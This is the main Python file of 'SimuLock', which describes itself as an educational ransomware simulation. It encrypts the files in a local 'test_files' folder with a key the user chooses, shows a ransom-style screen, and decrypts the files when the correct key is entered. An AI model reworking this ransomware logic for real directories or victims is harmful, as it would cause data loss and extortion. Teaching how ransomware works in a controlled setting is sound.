# ───────────────────────────────────────────────
# SimuLock v1.0
# Educational Ransomware Simulation
# ───────────────────────────────────────────────
#
# Descrição:
# Sistema de simulação de ransomware desenvolvido
# para fins acadêmicos. O projeto demonstra conceitos
# de criptografia, controle de execução e recuperação
# de dados em ambiente controlado.
#
# Funcionalidades:
# - Criptografia de arquivos (AES-256 GCM)
# - Descriptografia mediante chave correta
# - Interface gráfica simulando ataque
# - Controle de execução via arquivo .flag
# - Registro de logs de operação
#
# Aviso:
# Este software é exclusivamente educacional.
# Não deve ser utilizado para fins maliciosos.
#
# Autor: [m4ntonio]
# Data: [2026-04-27]
# Versão: 1.0
# ───────────────────────────────────────────────

from scanner import scan_files
from crypto import encrypt_file, decrypt_file
from logger import log
from control import already_executed, mark_executed
from ui import ransom_screen
from pathlib import Path
from getpass import getpass

TARGET = "test_files"

def preparar_ambiente():
    path = Path(TARGET)

    # cria pasta se não existir
    path.mkdir(parents=True, exist_ok=True)

    # verifica se está vazia
    arquivos = list(path.glob("*"))

    if not arquivos:
        print("\n[!] Nenhum arquivo encontrado em 'test_files'.")
        print("[!] Adicione arquivos para simulação e tente novamente.\n")
        return False

    return True

def mostrar_banner():
    print("""
☢︎ SimuLock v1.0
───────────────────────────────────
 Educational Ransomware Simulation
───────────────────────────────────
""")

def obter_senha():
    try:
        return getpass("> Defina a chave: ").encode()
    except KeyboardInterrupt:
        print("\n\n[!] Execução cancelada pelo usuário.\n")
        exit(0)

def main():
    mostrar_banner()

    if already_executed():
        print("\n[!] Sistema já executado.\n")
        return

    if not preparar_ambiente():
        return

    senha = obter_senha()

    files = scan_files(TARGET)

    log("Início da execução")

    for f in files:
        encrypt_file(f, senha)
        log(f"Criptografado: {f}")

    mark_executed()

    # ================= UI =================

    # OPÇÃO 1 — Interface terminal (simples, fallback)
    # from ui import ransom_screen
    # user_key = ransom_screen().encode()
    #
    # if user_key == senha:
    #     locked_files = Path(TARGET).rglob("*.locked")
    #     for f in locked_files:
    #         decrypt_file(f, senha)
    #         log(f"Descriptografado: {f}")
    #     print("Arquivos recuperados")
    # else:
    #     log("Tentativa de chave incorreta")
    #     print("Chave incorreta")


    # OPÇÃO 2 — Interface gráfica (principal)
    from ui_gui import mostrar_ransom_gui

    def verificar_chave(input_key):
        if input_key.encode() == senha:
            locked_files = Path(TARGET).rglob("*.locked")
            for f in locked_files:
                decrypt_file(f, senha)
                log(f"Descriptografado: {f}")
            return True
        else:
            log("Tentativa de chave incorreta")
            return False

    mostrar_ransom_gui(verificar_chave)

if __name__ == "__main__":
    main()